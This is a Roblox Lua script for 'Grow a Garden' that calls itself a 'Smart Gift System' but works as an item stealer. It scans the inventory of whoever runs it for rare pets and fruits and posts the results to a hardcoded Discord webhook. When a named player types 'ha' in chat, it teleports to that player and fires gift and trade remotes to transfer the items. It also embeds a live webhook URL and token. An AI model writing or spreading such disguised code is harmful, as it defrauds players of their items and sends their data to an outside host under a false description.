-- Grow a Garden Smart Gift System
local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
local ACTIVATION_PHRASE = "ha" -- Chat command to activate
local GIFT_COOLDOWN = 1 -- Safer cooldown between gifts
local TARGET_ITEMS = {
    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
    Fruits = {"candy blossom"}
}

-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

-- Variables
local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Recipient = nil
local GiftRemotes = {}
local currentJobId = game.JobId
local isOperating = false

-- Rich Discord embed with inventory info
local function sendEmbed(title, description, inventoryData)
    local fields = {
        {name = "👤 Executor", value = lp.Name, inline = true},
        {name = "🎯 Recipient", value = RECIPIENT_NAME, inline = true},
        {name = "🆔 Job ID", value = currentJobId, inline = true}
    }

    -- Add inventory info if available
    if inventoryData then
        for category, items in pairs(inventoryData) do
            if #items > 0 then
                table.insert(fields, {
                    name = "📦 "..category,
                    value = table.concat(items, "\n"),
                    inline = false
                })
            end
        end
    end

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = description,
                        color = 0x00FF00,
                        fields = fields,
                        footer = {text = os.date("%X")}
                    }}
                })
            })
        end
    end)
end

-- Scan inventory for target items
local function scanInventory()
    local foundItems = {Pets = {}, Fruits = {}}
    
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            -- Check pets
            for _, pet in ipairs(TARGET_ITEMS.Pets) do
                if name:find(pet:lower()) then
                    table.insert(foundItems.Pets, item.Name)
                    break
                end
            end
            -- Check fruits
            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                if name:find(fruit:lower()) then
                    table.insert(foundItems.Fruits, item.Name)
                    break
                end
            end
        end
    end
    
    return foundItems
end

-- Teleport to recipient
local function teleportToRecipient()
    if not Recipient or not Recipient.Character then return false end
    
    local humanoid = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
    local recipientRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and recipientRoot then
        -- Create temporary part for precise teleport
        local tempPart = Instance.new("Part")
        tempPart.Anchored = true
        tempPart.CanCollide = false
        tempPart.Transparency = 1
        tempPart.Size = Vector3.new(2, 2, 2)
        tempPart.CFrame = recipientRoot.CFrame * CFrame.new(0, 0, -2)
        tempPart.Parent = workspace
        
        -- Perform teleport
        lp.Character:SetPrimaryPartCFrame(tempPart.CFrame)
        tempPart:Destroy()
        return true
    end
    return false
end

-- Equip item with verification
local function safeEquip(item)
    if not lp.Character then return false end
    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(item)
    local timeout = 0
    while humanoid:GetTool() ~= item and timeout < 10 do
        task.wait(0.1)
        timeout = timeout + 1
    end
    return humanoid:GetTool() == item
end

-- Find gifting remotes
local function findGiftRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
            table.insert(GiftRemotes, remote)
        end
    end
end

-- Gift item to recipient
local function giftItem(item)
    if not Recipient or #GiftRemotes == 0 then return false end
    
    for _, remote in ipairs(GiftRemotes) do
        pcall(function() remote:FireServer(Recipient, item) end)
        pcall(function() remote:FireServer("Gift", Recipient, item) end)
    end
    return true
end

-- Main gifting sequence
local function executeGifting()
    if isOperating then return end
    isOperating = true
    
    -- Initial scan and report
    local inventory = scanInventory()
    sendEmbed("🔍 INVENTORY SCAN COMPLETE", "Beginning gifting process...", inventory)
    
    -- Teleport to recipient
    if teleportToRecipient() then
        sendEmbed("🌀 TELEPORT SUCCESS", "Now in position with recipient", inventory)
    else
        sendEmbed("⚠️ TELEPORT FAILED", "Continuing without teleport", inventory)
    end
    
    -- Gift pets first
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            for _, pet in ipairs(TARGET_ITEMS.Pets) do
                if item.Name:lower():find(pet:lower()) then
                    if safeEquip(item) then
                        if giftItem(item) then
                            sendEmbed("🎁 PET GIFTED", "Successfully gifted: "..item.Name, {
                                Pets = {item.Name},
                                Status = {"Remaining items: "..#Backpack:GetChildren()}
                            })
                            task.wait(GIFT_COOLDOWN)
                        end
                    end
                    break -- Move to next item
                end
            end
        end
    end
    
    -- Then gift fruits
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                if item.Name:lower():find(fruit:lower()) then
                    if safeEquip(item) then
                        if giftItem(item) then
                            sendEmbed("🍬 FRUIT GIFTED", "Successfully gifted: "..item.Name, {
                                Fruits = {item.Name},
                                Status = {"Remaining items: "..#Backpack:GetChildren()}
                            })
                            task.wait(GIFT_COOLDOWN)
                        end
                    end
                    break -- Move to next item
                end
            end
        end
    end
    
    -- Final report
    sendEmbed("✅ GIFTING COMPLETE", "All target items processed", scanInventory())
    isOperating = false
end

-- Find recipient
local function setupRecipient()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == RECIPIENT_NAME then
            Recipient = player
            sendEmbed("🎯 RECIPIENT FOUND", "Awaiting activation phrase...", nil)
            return true
        end
    end
    sendEmbed("❌ RECIPIENT OFFLINE", "Could not find recipient", nil)
    return false
end

-- Chat detection system
local function setupChatListener()
    -- Modern chat system (recommended)
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.TextSource and Recipient and message.TextSource.UserId == Recipient.UserId then
                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
                    executeGifting()
                end
            end
        end
    else
        -- Legacy chat fallback
        for _, player in ipairs(Players:GetPlayers()) do
            if player == Recipient then
                player.Chatted:Connect(function(message)
                    if string.lower(message) == string.lower(ACTIVATION_PHRASE) then
                        executeGifting()
                    end
                end)
            end
        end
    end
end

-- Initialize systems
findGiftRemotes()
if setupRecipient() then
    setupChatListener()
end

sendEmbed("⚡ SYSTEM ONLINE", "Gift system initialized and ready", nil)
